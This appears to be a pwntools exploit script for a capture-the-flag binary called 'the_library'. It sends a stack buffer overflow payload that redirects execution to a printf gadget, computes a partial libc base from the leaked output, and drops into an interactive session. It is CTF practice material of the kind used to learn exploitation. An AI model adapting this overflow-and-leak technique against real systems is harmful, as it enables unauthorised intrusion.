#!/usr/bin/env python
from pwn import *
import struct

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './the_library'
host = 'challenge.ctf.games'
port = 30384

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main+194
break *main+383
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
elf = ELF(exe)

libc_start_main = 552
one_gadget = 0xe6c7e
printf_gadget = 0x40135d

buf = b''
buf += b'A' * libc_start_main
buf += p64(printf_gadget)

io = start()

io.sendlineafter('> ', buf)

io.readuntil(':(\n')
line = io.readline().decode('utf-8')

leak = u32(struct.pack('i', int(line[0:line.index('.')]))) - 1118695

log.info(f'leaked lower libc base @ 0x{leak:x}')

io.interactive()

